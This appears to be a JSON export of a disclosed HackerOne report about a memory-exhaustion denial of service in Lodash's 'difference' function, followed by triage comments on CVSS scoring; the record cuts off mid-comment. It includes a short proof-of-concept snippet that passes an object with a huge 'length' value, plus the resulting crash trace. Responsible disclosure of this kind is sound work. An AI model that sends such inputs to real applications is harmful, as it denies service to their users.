{"id":670779,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NzA3Nzk=","url":"https://hackerone.com/reports/670779","title":"Lodash \"difference\" (possibly others) Function Denial of Service Through Unvalidated Input","state":"Closed","substate":"informative","severity_rating":"critical","readable_substate":"Informative","created_at":"2019-08-09T23:22:49.175Z","submitted_at":"2019-08-09T23:22:49.175Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"spengietz","url":"/spengietz","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-04T19:49:06.258Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-12-04T19:48:56.407Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\nI would like to report a denial of service in Lodash.\nIt allows excessive usage of the NodeJS process's memory, leading to a \"JavaScript heap out of memory\" crash. The same vulnerability exists in the browser version of Lodash and causes Firefox's tab to crash and restart and causes Chrome's tab to completely freeze and become uncloseable (from my testing at least).\n\n# Module\n\n**module name:** Lodash\n**version:** Only tested in 4.17.15\n**npm page:** `https://www.npmjs.com/package/lodash`\n\n## Module Description\n\n\u003e Copy description from npm page\n\nA modern JavaScript utility library delivering modularity, performance \u0026 extras.\nThe Lodash library exported as Node.js modules.\n\n## Module Stats\n\n\u003e Replace stats below with numbers from npm’s module page:\n\n24,853,923 downloads in the last week\nI can't find where it lists the daily/monthly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\n\u003e Description about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.\n\nThe vulnerability was discovered while pentesting a web application for a client. The Lodash \"difference\" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L6947) uses the \"baseDifference\" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L2764) to perform what it needs to. \"difference\" is supposed to accept two arrays (`_.difference(array, [values])`) but it does not actually verify whether it is dealing with valid arrays before processing the data. This means a custom malicious Object can be supplied and the function will think it is an array, allowing excessive memory consumption that ends up in a crash of the Node.js process (or crash/freeze of the browser tab in Firefox/Chrome).\n\nIt was found to be exploitable in the clients application because they were passing user-supplied data into the \"difference\" function, which allowed me to crash their application with this vulnerability.\n\n## Steps To Reproduce:\n\n\u003e Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\n\nBenign example:\n```\nconst _ = require('lodash')\n\nuser_supplied_array = [1, 2, 3]\nvalues_to_compare_to = {'length': 5} // An object with the \"length\" property defined to an integer will be accepted as an array by the _.difference function\n\n_.difference(values_to_compare_to, user_supplied_array) // This will output a new array of length 5 where each value is \"undefined\"\n```\n\nBecause Lodash is essentially creating a new array of the length that we specify in \"values_to_compare_to\", we can provide a large value that will cause the Node.js process to crash before it can successfully create the array.\n\nWill crash Node.js example:\n```\nconst _ = require('lodash')\n\nuser_supplied_array = [1, 2, 3]\nvalues_to_compare_to = {'length': 99999999999} // This could be any huge value\n\n_.difference(values_to_compare_to, user_supplied_array) // The Node.js process will crash, saying that the JavaScript heap ran out of memory\n```\n\nWhen the Node.js process crashes, a stack trace similar to the following is output:\n```\n[5515:0x55aa82652700]    41959 ms: Mark-sweep 580.0 (585.7) -\u003e 580.0 (585.7) MB, 201.8 / 0.0 ms  allocation failure GC in old space requested\n[5515:0x55aa82652700]    42169 ms: Mark-sweep 580.0 (585.7) -\u003e 579.9 (584.2) MB, 209.7 / 0.0 ms  last resort GC in old space requested\n[5515:0x55aa82652700]    42372 ms: Mark-sweep 579.9 (584.2) -\u003e 579.9 (584.2) MB, 203.2 / 0.0 ms  last resort GC in old space requested\n\n\n\u003c--- JS stacktrace ---\u003e\n\n==== JS stack trace =========================================\n\nSecurity context: 0x2eaefaca5729 \u003cJSObject\u003e\n    1: baseDifference [/root/temp/tmp/node_modules/lodash/lodash.js:~2764] [pc=0x11aea9f0d272](this=0x28b6ba70c0f9 \u003cJSGlobal Object\u003e,array=0x3dd3a43ca4c9 \u003cObject map = 0x1294fe65a571\u003e,values=0x3dd3a43ca4a9 \u003cJSArray[2]\u003e,iteratee=0x3dd3a43822d1 \u003cundefined\u003e,comparator=0x3dd3a43822d1 \u003cundefined\u003e)\n    2: arguments adaptor frame: 2-\u003e4\n    3: /* anonymous */ [/root/temp/tmp/node_modules/lodash/lodash.j...\n\nFATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n 1: node::Abort() [node]\n 2: 0x55aa808c347e [node]\n 3: v8::Utils::ReportOOMFailure(char const*, bool) [node]\n 4: v8::internal::V8::FatalProcessOutOfMemory(char const*, bool) [node]\n 5: v8::internal::Factory::NewUninitializedFixedArray(int) [node]\n 6: 0x55aa80448b1d [node]\n 7: v8::internal::Runtime_GrowArrayElements(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n 8: 0x11aea9d842fd\nAborted\n```\n\n\n## Patch\n\n\u003e If you're able to provide a patch with the fix please post it in this section\n\nI don't know specifically, but it seems that proper verification that both inputs are arrays would fix this.\n\n## Supporting Material/References:\n\n\u003e State all technical information about the stack where the vulnerability was found\n\nTested on two separate operating systems with the same end results.\nWindows:\n- Windows 10\n- Node.js v8.9.4\n- npm version 5.6.0\n- Firefox 68.01 and Chrome 76.0.3809.100 when testing the browser version of Lodash\n\nLinux:\n- Kali Linux\n- Node.js v9.0.0\n- npm version 6.1.0\n- Did not test in Firefox/Chrome on this operating system\n\n# Wrap up\n\n\u003e Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: N, it said to report it here\n- I opened an issue in the related repository: N, it said not to publicly disclose it until after\n\n## Impact\n\nAn attacker could cause excessive resource consumption which could slow down the server for other users or they could cause an outright crash of the Node.js process, denying service to all users of the application.","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI would like to report a denial of service in Lodash.\u003cbr\u003e\nIt allows excessive usage of the NodeJS process\u0026#39;s memory, leading to a \u0026quot;JavaScript heap out of memory\u0026quot; crash. The same vulnerability exists in the browser version of Lodash and causes Firefox\u0026#39;s tab to crash and restart and causes Chrome\u0026#39;s tab to completely freeze and become uncloseable (from my testing at least).\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e Lodash\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e Only tested in 4.17.15\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/lodash\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eCopy description from npm page\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eA modern JavaScript utility library delivering modularity, performance \u0026amp; extras.\u003cbr\u003e\nThe Lodash library exported as Node.js modules.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eReplace stats below with numbers from npm’s module page:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e24,853,923 downloads in the last week\u003cbr\u003e\nI can\u0026#39;t find where it lists the daily/monthly downloads\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDescription about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThe vulnerability was discovered while pentesting a web application for a client. The Lodash \u0026quot;difference\u0026quot; function (\u003ca title=\"https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L6947\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Flodash%2Flodash%2Fblob%2F4.17.15%2Flodash.js%23L6947\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/lodash/lodash/blob/4.17.15/lodash.js#L6947\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) uses the \u0026quot;baseDifference\u0026quot; function (\u003ca title=\"https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L2764\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Flodash%2Flodash%2Fblob%2F4.17.15%2Flodash.js%23L2764\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/lodash/lodash/blob/4.17.15/lodash.js#L2764\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) to perform what it needs to. \u0026quot;difference\u0026quot; is supposed to accept two arrays (\u003ccode\u003e_.difference(array, [values])\u003c/code\u003e) but it does not actually verify whether it is dealing with valid arrays before processing the data. This means a custom malicious Object can be supplied and the function will think it is an array, allowing excessive memory consumption that ends up in a crash of the Node.js process (or crash/freeze of the browser tab in Firefox/Chrome).\u003c/p\u003e\n\n\u003cp\u003eIt was found to be exploitable in the clients application because they were passing user-supplied data into the \u0026quot;difference\u0026quot; function, which allowed me to crash their application with this vulnerability.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDetailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eBenign example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst _ = require(\u0026#39;lodash\u0026#39;)\n\nuser_supplied_array = [1, 2, 3]\nvalues_to_compare_to = {\u0026#39;length\u0026#39;: 5} // An object with the \u0026quot;length\u0026quot; property defined to an integer will be accepted as an array by the _.difference function\n\n_.difference(values_to_compare_to, user_supplied_array) // This will output a new array of length 5 where each value is \u0026quot;undefined\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause Lodash is essentially creating a new array of the length that we specify in \u0026quot;values_to_compare_to\u0026quot;, we can provide a large value that will cause the Node.js process to crash before it can successfully create the array.\u003c/p\u003e\n\n\u003cp\u003eWill crash Node.js example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst _ = require(\u0026#39;lodash\u0026#39;)\n\nuser_supplied_array = [1, 2, 3]\nvalues_to_compare_to = {\u0026#39;length\u0026#39;: 99999999999} // This could be any huge value\n\n_.difference(values_to_compare_to, user_supplied_array) // The Node.js process will crash, saying that the JavaScript heap ran out of memory\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen the Node.js process crashes, a stack trace similar to the following is output:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[5515:0x55aa82652700]    41959 ms: Mark-sweep 580.0 (585.7) -\u0026gt; 580.0 (585.7) MB, 201.8 / 0.0 ms  allocation failure GC in old space requested\n[5515:0x55aa82652700]    42169 ms: Mark-sweep 580.0 (585.7) -\u0026gt; 579.9 (584.2) MB, 209.7 / 0.0 ms  last resort GC in old space requested\n[5515:0x55aa82652700]    42372 ms: Mark-sweep 579.9 (584.2) -\u0026gt; 579.9 (584.2) MB, 203.2 / 0.0 ms  last resort GC in old space requested\n\n\n\u0026lt;--- JS stacktrace ---\u0026gt;\n\n==== JS stack trace =========================================\n\nSecurity context: 0x2eaefaca5729 \u0026lt;JSObject\u0026gt;\n    1: baseDifference [/root/temp/tmp/node_modules/lodash/lodash.js:~2764] [pc=0x11aea9f0d272](this=0x28b6ba70c0f9 \u0026lt;JSGlobal Object\u0026gt;,array=0x3dd3a43ca4c9 \u0026lt;Object map = 0x1294fe65a571\u0026gt;,values=0x3dd3a43ca4a9 \u0026lt;JSArray[2]\u0026gt;,iteratee=0x3dd3a43822d1 \u0026lt;undefined\u0026gt;,comparator=0x3dd3a43822d1 \u0026lt;undefined\u0026gt;)\n    2: arguments adaptor frame: 2-\u0026gt;4\n    3: /* anonymous */ [/root/temp/tmp/node_modules/lodash/lodash.j...\n\nFATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n 1: node::Abort() [node]\n 2: 0x55aa808c347e [node]\n 3: v8::Utils::ReportOOMFailure(char const*, bool) [node]\n 4: v8::internal::V8::FatalProcessOutOfMemory(char const*, bool) [node]\n 5: v8::internal::Factory::NewUninitializedFixedArray(int) [node]\n 6: 0x55aa80448b1d [node]\n 7: v8::internal::Runtime_GrowArrayElements(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n 8: 0x11aea9d842fd\nAborted\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIf you\u0026#39;re able to provide a patch with the fix please post it in this section\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI don\u0026#39;t know specifically, but it seems that proper verification that both inputs are arrays would fix this.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eState all technical information about the stack where the vulnerability was found\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eTested on two separate operating systems with the same end results.\u003cbr\u003e\nWindows:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eWindows 10\u003c/li\u003e\n\u003cli\u003eNode.js v8.9.4\u003c/li\u003e\n\u003cli\u003enpm version 5.6.0\u003c/li\u003e\n\u003cli\u003eFirefox 68.01 and Chrome 76.0.3809.100 when testing the browser version of Lodash\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eLinux:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eKali Linux\u003c/li\u003e\n\u003cli\u003eNode.js v9.0.0\u003c/li\u003e\n\u003cli\u003enpm version 6.1.0\u003c/li\u003e\n\u003cli\u003eDid not test in Firefox/Chrome on this operating system\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSelect Y or N for the following statements:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N, it said to report it here\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N, it said not to publicly disclose it until after\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker could cause excessive resource consumption which could slow down the server for other users or they could cause an outright crash of the Node.js process, denying service to all users of the application.\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["macasun","eveeez","0x08","pewpewpew-soul","yoflow","cykich"],"severity":{"rating":"critical","score":9.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":5914,"asset_type":"SOURCE_CODE","asset_identifier":"lodash","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5542161,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003eTo help us escalate this report as quickly as possible, please take a moment to confirm your report addresses:\n\n**Reproducible:** I included example code to crash the Node.js process\n**Impact:** I demonstrated and described the impact of slowing down the server and/or crashing it completely.\n**In Scope:** Lodash is listed as in-scope\n\nThanks!","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eTo help us escalate this report as quickly as possible, please take a moment to confirm your report addresses:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003cstrong\u003eReproducible:\u003c/strong\u003e I included example code to crash the Node.js process\u003cbr\u003e\n\u003cstrong\u003eImpact:\u003c/strong\u003e I demonstrated and described the impact of slowing down the server and/or crashing it completely.\u003cbr\u003e\n\u003cstrong\u003eIn Scope:\u003c/strong\u003e Lodash is listed as in-scope\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-09T23:26:34.870Z","updated_at":"2019-08-09T23:26:34.870Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5542180,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I forgot to include that this likely affects more than just the \"difference\" function because the vulnerability lies within the \"baseDifference\" function, meaning that other Lodash methods that use that function might be vulnerable to this denial of service as well.","markdown_message":"\u003cp\u003eI forgot to include that this likely affects more than just the \u0026quot;difference\u0026quot; function because the vulnerability lies within the \u0026quot;baseDifference\u0026quot; function, meaning that other Lodash methods that use that function might be vulnerable to this denial of service as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-09T23:34:17.293Z","updated_at":"2019-08-09T23:34:17.293Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5556575,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @spengietz \n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nThanks, \n@ktistai","markdown_message":"\u003cp\u003eHi \u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eThanks, \u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-12T14:37:06.603Z","updated_at":"2019-08-12T14:37:06.603Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5557615,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @spengietz \n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@ktistai","markdown_message":"\u003cp\u003eHello \u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-12T17:06:38.128Z","updated_at":"2019-08-12T17:06:38.128Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5669459,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there, just wanted to check in and see if there were any updates here. Thanks!","markdown_message":"\u003cp\u003eHi there, just wanted to check in and see if there were any updates here. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-26T21:02:25.771Z","updated_at":"2019-08-26T21:02:25.771Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5763922,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, just wanted to check in here again. Thank you!","markdown_message":"\u003cp\u003eHey, just wanted to check in here again. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-09T17:09:05.282Z","updated_at":"2019-09-09T17:09:05.282Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5955233,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @spengietz,\n\nThanks a lot for reporting the vulnerability.\nI invited John Dalton, maintainer of lodash, to review and help us resolve the issue here.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks a lot for reporting the vulnerability.\u003cbr\u003e\nI invited John Dalton, maintainer of lodash, to review and help us resolve the issue here.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-03T22:29:27.411Z","updated_at":"2019-10-03T22:29:27.411Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5955241,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-03T22:31:21.500Z","updated_at":"2019-10-03T22:31:21.500Z","additional_data":{"old_severity":"High","new_severity":"Critical (9.3)","old_severity_id":489415,"new_severity_id":530904},"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5955242,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@spengietz could you also see if I got the CVSS score right for this report in your opinion?","markdown_message":"\u003cp\u003e\u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e could you also see if I got the CVSS score right for this report in your opinion?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-03T22:31:40.847Z","updated_at":"2019-10-03T22:31:40.847Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5955341,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-03T23:11:14.616Z","updated_at":"2019-10-03T23:11:14.616Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5955386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Perfect, thanks @lirantal and @jdalton! Let me know if you have any questions","markdown_message":"\u003cp\u003ePerfect, thanks \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e and \u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e! Let me know if you have any questions\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-03T23:23:10.231Z","updated_at":"2019-10-03T23:23:10.231Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5955406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Whoops I misread your message.\nI just tried calculating the CVSS and came out with an 8.6 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H), but I don't work with CVSS rankings typically so I may be off on a switch or two there.","markdown_message":"\u003cp\u003eWhoops I misread your message.\u003cbr\u003e\nI just tried calculating the CVSS and came out with an 8.6 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H), but I don\u0026#39;t work with CVSS rankings typically so I may be off on a switch or two there.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-03T23:31:00.834Z","updated_at":"2019-10-03T23:31:45.824Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5959342,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The difference with both of our scores is the Scope. Why do you feel it is changed? \nFor example, the vulnerable component is Node.js and the affected component is Node.js too.","markdown_message":"\u003cp\u003eThe difference with both of our scores is the Scope. Why do you feel it is changed? \u003cbr\u003e\nFor example, the vulnerable component is Node.js and the affected component is Node.js too.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T13:44:28.122Z","updated_at":"2019-10-04T13:44:28.122Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5959739,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I 